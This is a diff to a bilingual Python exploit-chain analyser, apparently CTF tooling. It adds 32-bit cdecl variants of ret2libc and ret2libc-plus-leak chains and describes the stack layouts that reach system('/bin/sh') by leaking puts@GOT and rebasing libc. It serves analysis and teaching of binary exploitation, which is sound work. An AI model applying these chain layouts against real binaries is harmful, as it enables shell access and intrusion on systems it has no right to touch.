@@ -878,39 +878,69 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
         c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2win", f, lang)
     chains.append(c)
 
-    # 2) ret2libc: overflow -> pop rdi; ret -> system('/bin/sh')
-    c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
-    g_rdi = _best_for(gadgets, "rdi")
+    # 2) ret2libc -> system('/bin/sh').
+    #    64b: pop rdi=&/bin/sh (SysV: 1er arg en RDI); ret -> system.
+    #    32b (cdecl): los argumentos van en la PILA, NO en registros -> no hace falta `pop`;
+    #        se coloca [system][retorno_falso][&/bin/sh] directamente tras la direccion de retorno.
     has_sys, has_binsh = f.get("system") is not None, f.get("binsh") is not None
-    c.requirements = [
-        _req(rip, "control de RIP", "RIP control", lang),
-        _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
-        _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
-        _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
-    c.regs_needed = ["rdi"]
-    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
-    if g_rdi:
-        c.gadgets_used = [g_rdi.addr]
-        if g_rdi.clobbers:
-            c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
-                                 + ", ".join(g_rdi.clobbers))
-        if g_rdi.side_effects:
-            c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
-                                 + g_rdi.side_effects)
-    c.steps = [
-        ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
-        ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
-        ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
-                  addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
-                  stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
-                  constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
-                               else L("gadget ausente", "gadget absent"))),
-        ChainStep("target", "system('/bin/sh')",
-                  (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
-                   else L("requiere system()", "requires system()")),
-                  addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
-    _apply_badchars(c, [a for a in [g_rdi.addr if g_rdi else None, f.get("system"), f.get("binsh")] if a],
-                    _badset, _sink, lang)
+    if _bits == 32:
+        c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
+            _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
+        c.regs_needed = []     # cdecl: argumentos en la pila, sin gadgets de registro
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.constraints.append(L(
+            "cdecl x86-32: el argumento va en la pila tras una direccion de retorno de 4B "
+            "(usa `exit` o un gadget `ret` como retorno falso para salir limpio)",
+            "x86-32 cdecl: the argument sits on the stack after a 4B return address "
+            "(use `exit` or a `ret` gadget as the fake return for a clean exit)"))
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("primitive", ripc, regs={"eip": L("controlado", "controlled")}),
+            ChainStep("gadget", "layout de pila (cdecl)",
+                      L("[system][ret_falso][&'/bin/sh'] colocados tras EIP",
+                        "[system][fake_ret][&'/bin/sh'] placed after EIP"),
+                      stack=L("arg1 = &'/bin/sh' en [esp+4] al entrar en system",
+                              "arg1 = &'/bin/sh' at [esp+4] on entry to system")),
+            ChainStep("target", "system('/bin/sh')",
+                      (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
+                       else L("requiere system()", "requires system()")),
+                      addr=f.get("system"))]
+        _apply_badchars(c, [a for a in [f.get("system"), f.get("binsh")] if a], _badset, _sink, lang)
+    else:
+        c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
+        g_rdi = _best_for(gadgets, "rdi")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
+            _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
+            _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
+        c.regs_needed = ["rdi"]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        if g_rdi:
+            c.gadgets_used = [g_rdi.addr]
+            if g_rdi.clobbers:
+                c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
+                                     + ", ".join(g_rdi.clobbers))
+            if g_rdi.side_effects:
+                c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
+                                     + g_rdi.side_effects)
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
+            ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
+                      addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
+                      stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
+                      constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
+                                   else L("gadget ausente", "gadget absent"))),
+            ChainStep("target", "system('/bin/sh')",
+                      (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
+                       else L("requiere system()", "requires system()")),
+                      addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
+        _apply_badchars(c, [a for a in [g_rdi.addr if g_rdi else None, f.get("system"), f.get("binsh")] if a],
+                        _badset, _sink, lang)
     _score(c)
     if verify and _should_attempt_verify(c, f):
         c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc", f, lang)
@@ -973,35 +1003,67 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
     #    para llamar system('/bin/sh'). Solo tiene sentido si NO hay una via mas simple (win/system).
     if f.get("puts") and f.get("system") is None and f.get("win") is None:
         c = ExploitChain(name="ret2libc + leak", target="system('/bin/sh') via libc")
-        g_rdi = _best_for(gadgets, "rdi")
         lk = f.get("leak_fn") or "puts"
-        c.requirements = [
-            _req(rip, "control de RIP", "RIP control", lang),
-            _req(bool(g_rdi), "gadget `pop rdi; ret`", "gadget `pop rdi; ret`", lang),
-            _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
-            _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
-                 "reentry point (main/vuln) for stage 2", lang),
-            _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
-                 "target libc (system and '/bin/sh' offsets)", lang)]
-        c.regs_needed = ["rdi"]
-        c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)  # direcciones de libc en runtime
-        if g_rdi:
-            c.gadgets_used = [g_rdi.addr]
-        c.steps = [
-            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
-            ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
-            ChainStep("gadget", f"[fase 1] pop rdi; {lk}@PLT",
-                      L(f"filtra {lk}@GOT para calcular la base de libc y reentra en main",
-                        f"leaks {lk}@GOT to compute the libc base and reenters main"),
-                      addr=g_rdi.addr if g_rdi else None,
-                      regs={"rdi": f"{lk}@GOT"}, stack=L("reentra: 2a etapa", "reenter: stage 2"),
-                      constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
-            ChainStep("gadget", "[fase 2] pop rdi; system",
-                      L("con la base de libc: rdi=&'/bin/sh', llama a system", "with libc base: rdi=&'/bin/sh', call system"),
-                      regs={"rdi": "&'/bin/sh' (libc)"} ),
-            ChainStep("target", "system('/bin/sh')",
-                      L("shell via libc rebaseada", "shell via rebased libc"),
-                      regs={"rip": "system@libc"})]
+        if _bits == 32:
+            # x86-32 cdecl: el leak es `puts@plt; reentry; puts@GOT` (arg en la pila, sin `pop`).
+            c.requirements = [
+                _req(rip, "control de RIP", "RIP control", lang),
+                _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
+                _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
+                     "reentry point (main/vuln) for stage 2", lang),
+                _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
+                     "target libc (system and '/bin/sh' offsets)", lang)]
+            c.regs_needed = []
+            c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)
+            c.constraints.append(L(
+                "cdecl x86-32: argumentos en la pila; el leak es [{0}@plt][reentry][{0}@GOT] y la "
+                "2a etapa [system][exit][&'/bin/sh'] -- sin gadgets `pop`".format(lk),
+                "x86-32 cdecl: stack args; the leak is [{0}@plt][reentry][{0}@GOT] and stage 2 is "
+                "[system][exit][&'/bin/sh'] -- no `pop` gadgets".format(lk)))
+            c.steps = [
+                ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+                ChainStep("primitive", ripc, regs={"eip": L("controlado", "controlled")}),
+                ChainStep("gadget", f"[fase 1] {lk}@PLT( {lk}@GOT )",
+                          L(f"filtra {lk}@GOT (en la pila) para calcular la base de libc y reentra",
+                            f"leaks {lk}@GOT (on the stack) to compute the libc base and reenters"),
+                          stack=L("[{0}@plt][reentry][{0}@GOT]".format(lk), "[{0}@plt][reentry][{0}@GOT]".format(lk)),
+                          constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
+                ChainStep("gadget", "[fase 2] system (cdecl)",
+                          L("con la base de libc: [system][exit][&'/bin/sh'] en la pila",
+                            "with libc base: [system][exit][&'/bin/sh'] on the stack"),
+                          stack="[system][exit][&'/bin/sh']"),
+                ChainStep("target", "system('/bin/sh')",
+                          L("shell via libc rebaseada", "shell via rebased libc"),
+                          regs={"eip": "system@libc"})]
+        else:
+            g_rdi = _best_for(gadgets, "rdi")
+            c.requirements = [
+                _req(rip, "control de RIP", "RIP control", lang),
+                _req(bool(g_rdi), "gadget `pop rdi; ret`", "gadget `pop rdi; ret`", lang),
+                _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
+                _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
+                     "reentry point (main/vuln) for stage 2", lang),
+                _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
+                     "target libc (system and '/bin/sh' offsets)", lang)]
+            c.regs_needed = ["rdi"]
+            c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)  # direcciones de libc en runtime
+            if g_rdi:
+                c.gadgets_used = [g_rdi.addr]
+            c.steps = [
+                ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+                ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
+                ChainStep("gadget", f"[fase 1] pop rdi; {lk}@PLT",
+                          L(f"filtra {lk}@GOT para calcular la base de libc y reentra en main",
+                            f"leaks {lk}@GOT to compute the libc base and reenters main"),
+                          addr=g_rdi.addr if g_rdi else None,
+                          regs={"rdi": f"{lk}@GOT"}, stack=L("reentra: 2a etapa", "reenter: stage 2"),
+                          constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
+                ChainStep("gadget", "[fase 2] pop rdi; system",
+                          L("con la base de libc: rdi=&'/bin/sh', llama a system", "with libc base: rdi=&'/bin/sh', call system"),
+                          regs={"rdi": "&'/bin/sh' (libc)"} ),
+                ChainStep("target", "system('/bin/sh')",
+                          L("shell via libc rebaseada", "shell via rebased libc"),
+                          regs={"rip": "system@libc"})]
         _score(c)
         if verify and _should_attempt_verify(c, f):
             c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc_leak", f, lang)
